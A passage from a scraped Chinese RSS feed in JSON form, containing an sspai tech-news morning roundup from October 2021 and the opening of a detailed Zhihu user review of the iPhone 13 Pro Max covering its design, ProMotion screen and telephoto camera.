href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/491200346/answer/2161450448?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">197 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/268190060?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待辛亥革命中孙中山屡战屡败？</a><br><a href=\"http://www.zhihu.com/question/30490004?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么孙中山领导的辛亥革命引起了近代中国的历史性巨大变化？</a><br>\n","link":"http://www.zhihu.com/question/491200346/answer/2161450448?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：OLED 版 Nintendo Switch 开售、微信回应 iOS 相册读取问题等","date":"2021-10-09 01:04:59","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>OLED 版 Nintendo Switch 开售，屏幕采用 RGB 排列</h3>\n<p>搭载 OLED 屏幕的 Nintendo Switch 于 10 月 8 日正式发售，该版本采用了 7 英寸 OLED 屏幕、改良设计的背部支架、内置以太网接口的 Dock 底座以及增强版音频单元，官方定价为 349 美元；The Verge 在其评测过程中还发现，该版本所搭载的 OLED 屏采用 RGB 排列而非 Pentile 排列，显示精度上更为优秀。<a href=\"https://www.theverge.com/2021/10/8/22660574/nintendo-switch-oled-model-availability-restock-best-buy-target-walmart-amazon-gamestop\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5gejudb34teh3cl9630.jpeg\"></figure><h3>微信回应 iOS 相册读取问题</h3>\n<p>针对「微信在后台反复读取用户相册」一事，微信方面回应称，iOS 系统为 App 开发者提供了相册更新通知接口，相册发生内容更新时会通知到 App，而这一行为会被记录成读取系统相册；当用户授权微信「读取系统相册权限」后，为方便用户在微信聊天过程中按「+」时可以快速发图，微信使用了该系统能力来优化图片选取和发送体验。上述行为均仅在手机本地完成。微信将在最新版微信中取消对该系统能力的使用并通过其它方法优化快速发图功能。<a href=\"https://weibo.com/1642634100/KBPS0cbNH\" target=\"_blank\">来源</a></p>\n<h3>YouTube 将取消 Rewind 年度回顾视频</h3>\n<p>YouTube 近日向 Tubefilter 证实称，因为需要涵盖的内容太多、通过一个视频进行回顾的做法变得不太实际，YouTube 官方将不会推出 2021 年的 Rewind 年度回顾视频。此前，YouTube 的 2018 年年度回顾视频因遗漏重要人物与内容获得大量差评，2019 年将内容选取交由数据算法后观众评价并没有太大变化，2020 年则因疫情和社会动乱而直接取消。<a href=\"https://www.tubefilter.com/2021/10/07/youtube-no-longer-making-year-end-rewind-videos/\" target=\"_blank\">来源</a></p>\n<h3>Apple 因 Apple Pay 及 App Store 支付规则面临反垄断诉讼</h3>\n<p>近日欧盟就 iPhone NFC 芯片接入 Apple Pay 功能但阻止其它支付服务接入的行为发起诉讼，诉讼称此举违反了欧盟相关规定，Apple 因此或将面临其营业额 10% 的罚款，Apple 方面则表示 Apple Pay 的这一政策是出于安全和隐私问题考虑；此外荷兰的监管机构近日也就 Apple 的 App Store 支付规则发起反垄断指控，称其限制了开发人员使用自己的支付系统、违反了市场竞争规则。目前相关指控均在法律审查阶段，相关调查结果将在年内公布。<a href=\"https://www.xda-developers.com/apple-faces-antitrust-charges-over-nfc-chip-and-app-store-payment-rules/\" target=\"_blank\">来源</a></p>\n<h3>科幻动画剧集《银翼杀手：黑莲花》预告片公布</h3>\n<p>动画频道 Adult Swim 于 10 月 8 日正式放出了由经典电影系列「银翼杀手」改编的 CG 动画剧集《银翼杀手：黑莲花》正式预告片。该剧由渡边信一郎（《星际牛仔》）担任创意总监，神山健治（《攻壳机动队》）、荒牧伸志（《攻壳机动队 SAC2045》）执导，主题曲《Feel You Now》由阿莱西亚·卡拉创作， 故事设定于原作和《银翼杀手 2049》之间的 2032 年。《银翼杀手：黑莲花》将于 2021 年 11 月 13 日开播，共 13 集。<a href=\"https://www.vgtime.com/topic/1137410.jhtml\" target=\"_blank\">来源</a></p>\n<h2>看看就行的小道消息</h2>\n<ul>\n<li>爆料者 @MajinBuOfficial 的消息称，Apple 正在开发搭载全新 M1X 处理器、512GB 存储空间和 16GB 内存的 MacBook Pro。<a href=\"https://www.ithome.com/0/579/366.htm\" target=\"_blank\">来源</a>\n</li>\n<li>彭博社的一份最新报告称，Apple 正寻求将 CarPlay 的功能扩展到包括空调系统、收音机、车速表、座椅等核心汽车功能当中。<a href=\"https://www.ithome.com/0/579/338.htm\" target=\"_blank\">来源</a>\n</li>\n<li>两段组装和拆解 Google Pixel 6 Pro 的视频曝光，进一步确认了 UWB 芯片、毫米波支持等信息。<a href=\"https://mspoweruser.com/google-pixel-6-pro-assembly-and-disassembly-videos-leak/\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2>少数派的近期动态</h2>\n<ul>\n<li>📷️ 国庆拍的照片想发朋友圈？一起在 <a href=\"https://sspai.com/bullet/1633166447\" target=\"_blank\">一派</a> 聊聊你发朋友圈都会用到的修图工具吧！</li>\n<li>📖 Apple 发布会上没有「One More Thing」？我们给你备上了：《少数派系统指南 · iOS 15》上架预购八折优惠中，更多介绍请前往 <a href=\"https://sspai.com/series/228\" target=\"_blank\">栏目页面</a> 查看。</li>\n<li>🎁 少数派会员通讯《<a href=\"https://sspai.com/prime/precog/vol09-pre-we-all-love-coffee\" target=\"_blank\">我们都爱喝咖啡</a>》已经上线，我们从咖啡店的经营到「个人移动咖啡馆」的搭建，全面聊聊令人欲罢不能的咖啡体验。</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>，Kindle 商店电子书版也已上架。</li>\n</ul>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li>⌚ <a href=\"https://sspai.com/post/69142\" target=\"_blank\">新一代 Apple Watch 开卖，如何选择适合自己的那一款？</a>\n</li>\n<li>🎥 <a href=\"https://sspai.com/post/69183\" target=\"_blank\">本周看什么丨最近值得一看的 8 部作品</a>\n</li>\n<li>📸 <a href=\"https://sspai.com/post/69124\" target=\"_blank\">在 iPhone 上还原相机体验，让「拍好照片」变得更简单：NOMO RAW 2.0</a>\n</li>\n<li>🕹️ <a href=\"https://sspai.com/post/69078\" target=\"_blank\">雅达利是怎么把自己「折腾至死」的？</a>\n</li>\n<li>🚗 <a href=\"https://sspai.com/post/69067\" target=\"_blank\">靠「安全评分」进军汽车保险？特斯拉要反过来教司机开车</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69196"},{"title":"iPhone 13 Pro/13 Pro Max 的实际体验如何？","date":"2021-10-08 15:51:18","description":"\n<p>我是第一批拿到机器的消费者，首发当天上午就收到了装着 iPhone 13 Pro Max 的快递包，现在已经体验快两星期了。</p>\n<p>先上几张定妆照。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7e47e9cb9e6e5091703d4410680965e3_720w.jpg?rss\" data-rawwidth=\"5933\" data-rawheight=\"3955\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7e47e9cb9e6e5091703d4410680965e3\" data-watermark-src=\"v2-6661b738fe1d5b4cdbfece521ddfa779\" data-private-watermark-src=\"v2-2996bc1b8e4e59cf3861ec4854bf2407\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-76e896e886bd7f6510d05f8c224640f7_720w.jpg?rss\" data-rawwidth=\"5976\" data-rawheight=\"3984\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-76e896e886bd7f6510d05f8c224640f7\" data-watermark-src=\"v2-311d04e0f8baf7a3b5e101ddb232d6c8\" data-private-watermark-src=\"v2-00100f49306aeee4fff5ee2e9fb501c0\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-19d1ea1f8c4e545d3b19bd179b27fdcc_720w.jpg?rss\" data-rawwidth=\"5941\" data-rawheight=\"3961\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-19d1ea1f8c4e545d3b19bd179b27fdcc\" data-watermark-src=\"v2-ec632f2a8c6f1a30b89fb37fd7b94129\" data-private-watermark-src=\"v2-3752d99a702e542d14e13fe3dffd865c\"></p>\n<p>熟悉我的很多小伙伴都知道，我每年都会在知乎上出一篇 iPhone 的超详细评测文章。今年实在是太忙了，拖了快一周，我已经快被评论和私信催爆了。</p>\n<p><b>本文会是一篇极尽详细的iPhone 13 Pro Max 使用报告，我会尽可能多地向大家提供这款手机方方面面的使用体验，并附上相关技术的详细解析和科普，最后给出我自己的iPhone购买推荐。</b></p>\n<h2><b>购机背景</b></h2>\n<p>我是长期的 iPhone 用户，也是数码发烧友。近五年来，每代 iPhone 我都会从中挑一款作为主力机使用，近些年的安卓机也用了好几台，算是都比较了解。</p>\n<p><b>今年我选择的主力机是 iPhone 13 Pro Max，主要原因是我之前用了太多年的 6.1 英寸屏幕，想追求一下超大屏的新鲜感，这代 Pro 系列的相机和屏幕升级也巨大，所以果断入手。</b></p>\n<h2><b>开箱&amp;外观</b></h2>\n<p>包装还是熟悉的味道，Pro 系列盒子是黑色底色。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3bd9584a986620f28d731a61026f0915_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"998\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3bd9584a986620f28d731a61026f0915\" data-watermark-src=\"v2-0b2de77907263a906e6e0afd6542da24\" data-private-watermark-src=\"v2-ab80ceb83955e709a9fbbfa0569e6e09\"></p>\n<p>这代为了环保，取消了塑封包装，改用了纸质封条。这种不加重消费者负担的环保，当然要大力赞扬。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5aa80cd89ff3729989680930593fae37_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-5aa80cd89ff3729989680930593fae37\" data-watermark-src=\"v2-0bc3cb8c5009e24ff5fe5001766aa366\" data-private-watermark-src=\"v2-375a2c0d46aec638cba791a15d4596bf\"></p>\n<p>配件和上代一样，卡针贴纸充电线，没有充电器，这种环保争议一直持续到现在。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-ed826a0a2d6b3fe08c61c2b79a5b974a_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"998\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ed826a0a2d6b3fe08c61c2b79a5b974a\" data-watermark-src=\"v2-4eaedfea05b0d7af43a9a3a52d97db1e\" data-private-watermark-src=\"v2-7c79078cf1bc73ca8e96230625bcd1b5\"></p>\n<p>iPhone 13 全系列都沿用了 iPhone 12 的直角边框设计，这点让人毫不意外，Apple 每代工业设计都会用两三年。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5e7b1c41553ba43e4abfbe61d87b7b8c_720w.jpg?rss\" data-rawwidth=\"5995\" data-rawheight=\"3997\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-5e7b1c41553ba43e4abfbe61d87b7b8c\" data-watermark-src=\"v2-799d4aac52c41c59f26e86e04d557d2f\" data-private-watermark-src=\"v2-6fc085d9f5b779b6a57677caab528182\"></p>\n<p>和上代一样，尽管侧面有按钮，但是依然可以侧着立在桌子上。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f1c9748341465a7d40dea959eed1af67_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f1c9748341465a7d40dea959eed1af67\" data-watermark-src=\"v2-c80bc7b80af4832a798465e4a85c6ae6\" data-private-watermark-src=\"v2-722ce364603be98af0b7fac1bb005ff4\"></p>\n<p>如果想让朋友第一时间看出你换了新手机，和我一样买新出的“远峰蓝色”就好，好看又有个性。</p>\n<p>远峰蓝（Sierra Blue），指的就是远观山峰时，山峰因为距离若隐若现时的产生的淡蓝色。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c71fdb9bec788981233302c307f30ac5_720w.jpg?rss\" data-rawwidth=\"1199\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-c71fdb9bec788981233302c307f30ac5\" data-watermark-src=\"v2-41f5f8d56c6b513cd6d7f8d60cd2afe1\" data-private-watermark-src=\"v2-df148355ac72f7f0a845a1daafff5d15\"></p>\n<p>11 Pro 的暗夜绿、12 Pro 的太平洋蓝、13 Pro 的远峰蓝，都是饱和度较低但是很能彰显质感的颜色，我都很喜欢。看起来 Apple 要给每代 Pro 系列都定制一个限定颜色，只卖一年。</p>\n<p>iPhone 13 Pro Max 的边框依然是手术级不锈钢，工艺依旧是业界顶级，在强光照耀下闪闪发亮，没有光线直射时会显示出固有的颜色。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-12b99ab7bb40bf1a60994c151aaf0776_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-12b99ab7bb40bf1a60994c151aaf0776\" data-watermark-src=\"v2-6af03711d4390238293b3dd26e3f4678\" data-private-watermark-src=\"v2-a0c9ca8b8dbf835ee1aea217342e94a8\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7de1128bf586e4744be71ea14e7d1f74_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7de1128bf586e4744be71ea14e7d1f74\" data-watermark-src=\"v2-d02e5ccb633b710ff4903b940af7b5f3\" data-private-watermark-src=\"v2-ffd320d81cdcfcb76c71fd5f96806454\"></p>\n<p>为了使远峰蓝色稳固附着在边框上，Apple 还使用了全新的涂层工艺。</p>\n<p>当然，粘指纹的老问题是所有镜面材质都无解的。</p>\n<p>相机镜头依然是整个手机最显眼的部分，这代相机的体积暴增。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5d719f1514fa6e0e78060902a477b77d_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-5d719f1514fa6e0e78060902a477b77d\" data-watermark-src=\"v2-7d8252f5511eaa7259d316dc7cabe319\" data-private-watermark-src=\"v2-0d298500c8e9ad5c44c2d2d27c7d418b\"></p>\n<p>这样看也没什么，但是和 12 放一起比一下你就知道了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cccb39f90bfd13dcc2cbd68ebd83d4b5_720w.jpg?rss\" data-rawwidth=\"5748\" data-rawheight=\"3832\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-cccb39f90bfd13dcc2cbd68ebd83d4b5\" data-watermark-src=\"v2-96085580035aeeafd89488c6eb54d6ce\" data-private-watermark-src=\"v2-2261531636cc4021b12888c044af68ba\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-85dfe4a961a9386d942b53bc63cabc3e_720w.jpg?rss\" data-rawwidth=\"5967\" data-rawheight=\"3978\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-85dfe4a961a9386d942b53bc63cabc3e\" data-watermark-src=\"v2-03a084b8d56083454cf40d623fc60e10\" data-private-watermark-src=\"v2-cbabed0b68852b3e6c3344658c8d2370\"></p>\n<p>两台手机的厚度是完全一样的，但是平放在桌上，13 Pro Max 明显有被架起来的感觉。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-efdb22cd67c5ff0088b68e8c3d929049_720w.jpg?rss\" data-rawwidth=\"5858\" data-rawheight=\"3905\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-efdb22cd67c5ff0088b68e8c3d929049\" data-watermark-src=\"v2-6462276ba35e80285e6c024989efc613\" data-private-watermark-src=\"v2-73ac4c6f5d316b44bbcd175b12154455\"></p>\n<p>相机太突出，以至于官方的保护壳也不得不突出一块保护镜头。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2ba9198a94601547d45444eea038b316_720w.jpg?rss\" data-rawwidth=\"3936\" data-rawheight=\"2624\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2ba9198a94601547d45444eea038b316\" data-watermark-src=\"v2-57ce126bf9ae65c6c95e0631f6ec9670\" data-private-watermark-src=\"v2-a9f254ea57fc5f5c57ffd7b779052e8f\"></p>\n<p>变大的相机模组让 iPhone 13 Pro Max 从背面看起来比例其实更像上代的非 Max 机型。</p>\n<p>这代 iPhone 还有个明显的变化，刘海缩小 20%，听筒被挪到了上边框。考虑到原深感镜头模组的复杂程度，我觉得这样已经非常好了，毕竟 FaceID 提供了业界独一无二的安全解锁体验。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-24c1f75f81c4b775ec00dfb4fa2e8bc6_720w.jpg?rss\" data-rawwidth=\"5979\" data-rawheight=\"3986\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-24c1f75f81c4b775ec00dfb4fa2e8bc6\" data-watermark-src=\"v2-b5a816016c9335fb6a448be3c279a315\" data-private-watermark-src=\"v2-d1ff44642dae9e0022ddf349865e859e\"></p>\n<p>两代原深感模组体积对比：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-ead6eea6851fc1a7ffd1b0caaff9ece3_720w.jpg?rss\" data-rawwidth=\"1600\" data-rawheight=\"1200\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ead6eea6851fc1a7ffd1b0caaff9ece3\" data-watermark-src=\"v2-a084c89eb3218b9845dffbb5de085b23\" data-private-watermark-src=\"v2-a5ce76223e513bd1e7ae687f2287b9a3\"></p>\n<p><b>如果说对外观设计的评价还可以说是“见仁见智”的话，那么iPhone 1 Pro Max 的做工绝对是无可争议的顶级了。</b>整个机器组装严丝合缝，玻璃与金属像是熔融的一体，几乎摸不出接缝。</p>\n<p>iPhone 13 同样采用了iPhone 12 系列上的超磁晶玻璃，可以有效减小碎屏的概率。比较遗憾的点是，iPhone 13 系列的后盖和12一样并没有采用这一技术，考虑到后盖摔碎的维修费用比屏幕更高，我觉得 Apple 应该把它也加强一下。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6413e0c57a324a99d92e1a6a5e97711d_720w.jpg?rss\" data-rawwidth=\"904\" data-rawheight=\"874\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-6413e0c57a324a99d92e1a6a5e97711d\" data-watermark-src=\"v2-e6bd3c40eedc64edea4313ce107b4dfc\" data-private-watermark-src=\"v2-c60abb62b73a1d66ea3844a73932f8db\"></p>\n<p>看热闹不嫌事大的小伙伴都想我弄跌落测试，我摔不起，但是给你们找了个视频，希望能尽兴。从测试中能看出，iPhone 13 Pro Max 的抗跌能力还是非常强的。</p>\n<a href=\"https://www.zhihu.com/video/1427859050092949504\">iPhone 13 Pro Max 跌落测试</a><p>当然如果你经常摔手机，日积月累手机肯定还是会受伤，我建议你带壳贴膜。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1427859846318661632\"></a><a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1427859938488459264\"></a><p><br></p>\n<h2>屏幕</h2>\n<p> 熟悉 iPad 的小伙伴一定知道，iPad Pro 的屏幕有高达 120Hz 的 ProMotion 自适应刷新率技术，现在 iPhone 13 Pro 也有了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-477ae6e656aa521665b4705cbb45bf06_720w.jpg?rss\" data-rawwidth=\"1755\" data-rawheight=\"1756\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>ProMotion 绝不仅仅是高刷新率，它的精髓在于<b>可变刷新率</b>：显示动画用120Hz，看普通视频降到30Hz，看电影降到24Hz，显示静止画面是甚至要降到10Hz省电。这只有采用了 LTPO 技术的顶级 OLED 面板才能实现，市面上绝大多数的高刷新率屏幕手机都是固定120Hz 显示，明显更耗电。</p>\n<p>事实上，iPhone 13 Pro Max 这块屏幕可以实现 12 档不同的刷新率，除了最高的 120Hz 和最低的 10Hz，播放视频常用的 60Hz 、30Hz和 24Hz 也都包含在内，用它看视频非常省电。同时，这块屏幕本身的能效也比上代有了大幅提升，两者相叠加就让 iPhone 13 Pro Max 的续航达到了历来 iPhone 的最强水准，我会在下面的续航测试中详细说说。</p>\n<p>iPhone 13 Pro 这块屏幕上有一个极具 Apple 特色的创新点：屏幕的刷新率和用户划屏的速度精准同步。大家每次划动手机时，指尖的速度并不是匀速，Apple 让动画显示帧率随着手指的运动调整，可以实现比恒定120 Hz刷新更流畅的视觉效果。软硬件深度绑定优化，这波果味很浓。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f445d65f7963e03696a73b19a64975ab_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"405\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f445d65f7963e03696a73b19a64975ab\" data-watermark-src=\"v2-4a91b076aaac507875d03c951f71297b\" data-private-watermark-src=\"v2-1cba351cc7794e27e79401943f02fdd7\"></p>\n<p>ProMotion 技术是数码发烧友千呼万唤的功能，更流畅的系统动画毫无疑问让人感到愉悦，看这篇文章的你大概率就是这样的用户。</p>\n<p>一位叫 Joshua Chang 的博主发了个视频，他找了身边用 iPhone 的朋友，让他们划动屏幕体验，问和之前的 iPhone 有什么区别，绝大多数人都说没感觉。但是当他拿了一台 iPhone 11 和一台 iPhone 13 Pro Max 让他们放在一起对比时，所有人都瞬间觉得老 iPhone 的动画不够流畅了。</p>\n<a href=\"https://www.zhihu.com/video/1427885092568465408\"></a><p>ProMotion 就是这样的功能，它平时默默工作，给你极致流畅的体验，但是你可能会习惯并忽略它。但是一旦把它从你的手机剥夺（比如打开省电模式），你就会觉得非常难受，简称“用了就回不去”。</p>\n<p>如果我身边的朋友让我推荐今年的 iPhone，同时他们对影像和续航没有极致的需求，我不会仅仅因为 ProMotion 而向他推荐 iPhone 13 Pro 系列的机器，iPhone 13 才是更合适的选择。</p>\n<p>说句题外话，如果你现在在用非 Pro 版本的 iPad，又换了 iPhone 13，那你从手机切到平板上的时候会更加感到体验上的割裂，因为平板屏幕更大，每一帧动画要移动更多距离，比手机更需要高刷。</p>\n<p>此外，iPhone 13 Pro Max 的显示效果也又上了一个台阶：最高亮度达到 1200nit，不仅阳光下又更好的观感，看 HDR 照片和视频也爽到爆炸。事实上，我觉得对于大多数人而言，这样的提升反倒是比 ProMotion 感知更强。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e042f3d8acc801c6dfbe55eecb57eac6_720w.jpg?rss\" data-rawwidth=\"1829\" data-rawheight=\"1102\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e042f3d8acc801c6dfbe55eecb57eac6\" data-watermark-src=\"v2-5744d4ae34cdfd6f9e0e3d7b35a2d193\" data-private-watermark-src=\"v2-cd4d812c54a608ba3e4a48242114d8bd\"></p>\n<p><br></p>\n<h2>相机</h2>\n<p>影像系统的更新才是 iPhone 13 Pro 系列最值得称道的部分。</p>\n<p>经典的超广+广角+长焦的配置，没有凑数镜头，每一个都变得更强了，下面让我来一一分析。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9b7db8edaeb762f5823c96e170ead10c_720w.jpg?rss\" data-rawwidth=\"1842\" data-rawheight=\"1657\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-9b7db8edaeb762f5823c96e170ead10c\" data-watermark-src=\"v2-3b18ea9ed41370cfa20deba2acd406da\" data-private-watermark-src=\"v2-38dd6bb9da14a149cd81d5536a0bb94b\"></p>\n<p>看看模组比上代变大了多少大家就清楚了。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5c5a988c943ce0870dca4d11c7df525e_720w.jpg?rss\" data-rawwidth=\"1623\" data-rawheight=\"909\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-5c5a988c943ce0870dca4d11c7df525e\" data-watermark-src=\"v2-399360490ef42385898ed681682aaabe\" data-private-watermark-src=\"v2-169035722456b2e5d749717fa4d3b440\"></p>\n<p><br></p>\n<p>首先说说长焦，这是我从非 Pro 机型升级上来感到最新奇的。iPhone 13 Pro 系列的长焦换用了全新的等效 77mm镜头，实现了相对主摄的三倍变焦，同时增加了夜景模式。更长的焦距不但拍的更远，还能实现更强的空间压缩感，很适合拍人像。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ad7bc2f86aca9cbbb777836258d1f705_720w.jpg?rss\" data-rawwidth=\"1440\" data-rawheight=\"873\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ad7bc2f86aca9cbbb777836258d1f705\" data-watermark-src=\"v2-6fffaed0b6bb43bfbe1454d0aff61188\" data-private-watermark-src=\"v2-a1318e070dddaa89b1175fce87b895fe\"></p>\n<p>分享一些我拍的样片吧：</p>\n<p>长焦镜头拍城市高楼的剪影非常棒。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b174a44f163d527bac863e8a1f65c56e_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"1775\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b174a44f163d527bac863e8a1f65c56e\" data-watermark-src=\"v2-740af576fd711a766bdcb8654a84e8ac\" data-private-watermark-src=\"v2-0cece93069da664a8c07a176d646aa87\"></p>\n<p>拍个小动物毫无问题。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f8085c9b56cdbe55741a665365801c30_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"998\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f8085c9b56cdbe55741a665365801c30\" data-watermark-src=\"v2-5ad6f37e1e7f78e259893067e4953fc1\" data-private-watermark-src=\"v2-97649cf22cef705ce014c0d8c5e1b381\"></p>\n<p>长焦专注的视角更适合拍照验毒，对于很多用射灯的餐桌，拍照时手机也更不容易挡到光线。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5cbb750626a85ee8804277ba6b9bf68e_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"1331\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-5cbb750626a85ee8804277ba6b9bf68e\" data-watermark-src=\"v2-91309757522eecdb0c47ac5ca3843ab8\" data-private-watermark-src=\"v2-09ca9db9aee228975d2fb87cec63cfca\"></p>\n<p>等效77mm，压缩感有了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a594ab54bcc647060b370dd47fa3fa90_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"998\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-a594ab54bcc647060b370dd47fa3fa90\" data-watermark-src=\"v2-ecf27af7a4818302147602c182e0e5e3\" data-private-watermark-src=\"v2-2b599fb8a77f5ff5c3fd57ff2aa32842\"></p>\n<p>这次长焦镜头首次加入了夜景模式，这张照片曝光了3s。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5d758673162c5a998189bbadc3d53160_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"998\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-5d758673162c5a998189bbadc3d53160\" data-watermark-src=\"v2-078d4bd58bfae9f805b4cff674f9feb5\" data-private-watermark-src=\"v2-d81f06eb1a02959ec6e63e4b53b0494f\"></p>\n<p>比较令人遗憾的是，iPhone 13 Pro 系列的长焦镜头虽然等效焦距从上代的 65mm 增加到了 77mm，但是光圈也由 f2 缩小到了 f2.8，光线较暗时虽然能用夜景模式把画质弥补回来，但这确实是一个退步。对我个人而言，我更喜欢一个大光圈的 50mm 镜头，而不是一个小光圈的 77mm 镜头。</p>\n<p>长焦拍的全景。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5f62b60ca075d457565eccef9faafdc4_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"317\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-5f62b60ca075d457565eccef9faafdc4\" data-watermark-src=\"v2-280f576313723ac73120d2bedc087d14\" data-private-watermark-src=\"v2-e978827137421be1493c5c5136718839\"></p>\n<p>这代长焦镜头同样支持 4K 60P 杜比视界 HDR 视频，下面的片段是我手持拍摄的，防抖性能让我很是惊喜。</p>\n<a href=\"https://www.zhihu.com/video/1427894069091143680\"></a><p>我们回到镜头本身，为什么之前 iPhone 不用三倍长焦呢？答案在主摄上。</p>\n<p>iPhone 